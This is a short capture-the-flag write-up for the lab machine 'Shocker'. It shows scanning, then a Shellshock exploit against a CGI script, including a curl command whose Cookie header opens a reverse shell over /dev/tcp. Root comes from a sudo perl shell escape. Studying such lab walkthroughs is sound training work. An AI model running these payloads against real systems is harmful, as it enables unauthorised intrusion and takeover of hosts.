## Shocker

Difficulty: Easy

### User Flag

```
nmap 10.10.10.56 -T4
```

![nmap](https://user-images.githubusercontent.com/58514930/218160762-10b55d29-7427-4048-82b1-3e05012477aa.png)

<br>

```
gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/big.txt -t 30
```

![first_gobuster](https://user-images.githubusercontent.com/58514930/218160863-9aea4a75-9dd0-4439-ab3a-f9f5230bd871.png)

<br>

```
gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirb/big.txt -t 30 -x sh,cgi,pl
```

![second_gobuster](https://user-images.githubusercontent.com/58514930/218161145-9e443fc3-4a0f-4584-923e-184983408146.png)

<br>

#### Automatic Exploit

```
python2 exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.3 lport=3333 pages=/cgi-bin/user.sh
```

![automaticExploit](https://user-images.githubusercontent.com/58514930/218161283-6ec7ae19-e7e7-4c26-9af9-5eddc4e9f981.png)

<br>

#### Manual Exploit

```
curl -H 'Cookie:() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.14.3/3333 0>&1 &' http://10.10.10.56/cgi-bin/user.sh
```

![manualExploit](https://user-images.githubusercontent.com/58514930/218161373-5cac8aeb-9cdc-4af0-9cc7-bcc31fd9ecd7.png)

<br>

### Root Flag

Looking at sudo -l, we find perl with root permissions.

```
sudo perl -e 'exec "/bin/sh";'
```

![root](https://user-images.githubusercontent.com/58514930/218161441-36e405f5-f939-43b9-984b-d321ae6021ac.png)
